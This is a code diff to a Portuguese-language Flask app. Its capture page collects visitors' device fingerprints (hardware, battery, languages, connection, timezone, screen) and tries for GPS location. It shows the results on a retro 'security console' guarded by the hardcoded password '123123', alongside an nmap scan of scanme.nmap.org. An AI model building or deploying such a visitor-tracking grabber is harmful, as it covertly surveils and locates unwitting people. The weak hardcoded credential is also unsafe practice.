@@ -4,6 +4,7 @@ import urllib.request
 import json
 import nmap
 import threading
+from user_agents import parse
 
 app = Flask(__name__)
 
@@ -14,7 +15,7 @@ registros_ip = []
 # Senha simples para o seu painel
 SENHA_ADMIN = "123123"
 
-# Página HTML de Captura (Coleta hardware/bateria e tenta GPS)
+# Página HTML de Captura (Coleta hardware, bateria, rede, fuso horário e tenta GPS)
 HTML_CAPTURA = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -37,8 +38,14 @@ HTML_CAPTURA = """
                 deviceMemory: navigator.deviceMemory || 'Desconhecido',
                 platform: navigator.platform || 'Desconhecido',
                 language: navigator.language || 'Desconhecido',
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Desconhecido',
+                cookieEnabled: navigator.cookieEnabled ? 'Sim' : 'Não',
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : 'Desconhecido',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido',
                 bateria: 'Não suportado',
-                resolucqao: window.screen.width + 'x' + window.screen.height
+                resolucqao: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth + ' bits'
             };
 
             if (navigator.getBattery) {
@@ -90,7 +97,7 @@ HTML_CAPTURA = """
 </html>
 """
 
-# Painel Administrativo em Estilo Retro / COBOL
+# Painel Administrativo em Estilo Retro / COBOL com Auto-Refresh de 5 segundos
 HTML_PAINEL = """
 <!DOCTYPE html>
 <html lang="pt-BR">
@@ -137,13 +144,14 @@ HTML_PAINEL = """
         .aviso-vazio { color: #FF8888; text-align: center; font-style: italic; }
         .system-info { font-size: 11px; color: #55FF55; margin-bottom: 20px; }
         .badge-porta { background: #005500; color: #AAFFAA; padding: 2px 5px; border: 1px solid #55FF55; font-size: 11px; display: inline-block; margin: 2px; }
+        .badge-info { color: #55FFFF; }
     </style>
 </head>
 <body>
 <div class="container">
     <h2>=== MAINFRAME SECURITY CONSOLE // SISTEMA COBOL V3.0 ===</h2>
     <div class="system-info">
-        STATUS: ONLINE | NMAP ENGINE: ACTIVE (SCANME TARGET) | PROTOCOL: SECURE-TCP/IP
+        STATUS: ONLINE | AUTO-REFRESH: 5s | NMAP ENGINE: ACTIVE | PROTOCOL: SECURE-TCP/IP
     </div>
 
     <h3>[ TABELA 1: CAPTURAS DE GEOLOCALIZAÇÃO GPS ]</h3>
@@ -174,22 +182,38 @@ HTML_PAINEL = """
     <table>
         <tr>
             <th>DATA / HORA</th>
-            <th>IP / GEO</th>
+            <th>IP / GEO / REDE</th>
             <th>ISP / PROVEDOR</th>
             <th>HARDWARE / DISPOSITIVO (JS)</th>
+            <th>AMBIENTE & NAVEGADOR (USER-AGENT)</th>
             <th>PORTAS ABERTAS (NMAP LAB)</th>
-            <th>USER-AGENT</th>
         </tr>
         {% for r in ips %}
         <tr>
             <td>{{ r.data }}</td>
-            <td>{{ r.ip }}<br><span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }}</span></td>
+            <td>
+                {{ r.ip }}<br>
+                <span style="color: #FFFF55;">{{ r.cidade }}/{{ r.estado }} ({{ r.pais }})</span><br>
+                Rede: <span class="badge-info">{{ r.hw.connectionType }}</span>
+            </td>
             <td>{{ r.isp }}</td>
             <td>
                 CPU Cores: {{ r.hw.hardwareConcurrency }}<br>
                 RAM Aprox: {{ r.hw.deviceMemory }} GB<br>
                 Bateria: {{ r.hw.bateria }}<br>
-                Tela: {{ r.hw.resolucqao }}
+                Tela: {{ r.hw.resolucqao }} ({{ r.hw.colorDepth }})<br>
+                Toque: {{ r.hw.maxTouchPoints }} pts | Cookies: {{ r.hw.cookieEnabled }}<br>
+                Fuso: {{ r.hw.timezone }}
+            </td>
+            <td>
+                <b>OS:</b> {{ r.ua_info.os }}<br>
+                <b>Browser:</b> {{ r.ua_info.browser }}<br>
+                <b>Device:</b> {{ r.ua_info.device }}<br>
+                <b>Idioma:</b> {{ r.hw.language }} ({{ r.hw.languages }})<br>
+                <details style="margin-top: 5px;">
+                    <summary style="cursor: pointer; color: #55FFFF;">Ver User-Agent bruto</summary>
+                    <small style="word-break: break-all; color: #AAAAAA;">{{ r.user_agent }}</small>
+                </details>
             </td>
             <td>
                 {% if r.portas %}
@@ -200,13 +224,19 @@ HTML_PAINEL = """
                     <span style="color: #FFAAAA;">Varredura em execução...</span>
                 {% endif %}
             </td>
-            <td>{{ r.user_agent }}</td>
         </tr>
         {% else %}
         <tr><td colspan="6" class="aviso-vazio">>> NENHUM REGISTRO CAPTURADO AINDA <<</td></tr>
         {% endfor %}
     </table>
 </div>
+
+<script>
+    // Atualiza a tela automaticamente a cada 5 segundos mantendo a query string (senha)
+    setTimeout(function(){
+        window.location.reload();
+    }, 5000);
+</script>
 </body>
 </html>
 """
@@ -215,7 +245,6 @@ def executar_nmap_background(registro_ref):
     """Executa varredura Nmap demonstrativa no alvo padrão de testes (scanme.nmap.org)"""
     try:
         nm = nmap.PortScanner()
-        # Escaneia o alvo oficial de testes do Nmap para popular a tabela com dados reais de portas abertas
         nm.scan('scanme.nmap.org', arguments='-p 22,80,9929,31337 --open -T4')
         
         portas_encontradas = []
@@ -267,7 +296,16 @@ def salvar_ip():
     if ',' in ip_cliente:
         ip_cliente = ip_cliente.split(',')[0].strip()
         
-    user_agent = request.headers.get('User-Agent', 'Desconhecido')
+    user_agent_str = request.headers.get('User-Agent', 'Desconhecido')
+    
+    # Processa o User-Agent usando o pacote user-agents
+    parsed_ua = parse(user_agent_str)
+    ua_info = {
+        "os": f"{parsed_ua.os.family} {parsed_ua.os.version_string}".strip(),
+        "browser": f"{parsed_ua.browser.family} {parsed_ua.browser.version_string}".strip(),
+        "device": f"{parsed_ua.device.brand or ''} {parsed_ua.device.model or ''} ({'Mobile' if parsed_ua.is_mobile else 'Tablet' if parsed_ua.is_tablet else 'PC'})".strip()
+    }
+
     dados_hw = request.json or {}
     agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
@@ -294,7 +332,8 @@ def salvar_ip():
         "pais": pais,
         "isp": isp,
         "hw": dados_hw,
-        "user_agent": user_agent,
+        "ua_info": ua_info,
+        "user_agent": user_agent_str,
         "portas": []
     }
     
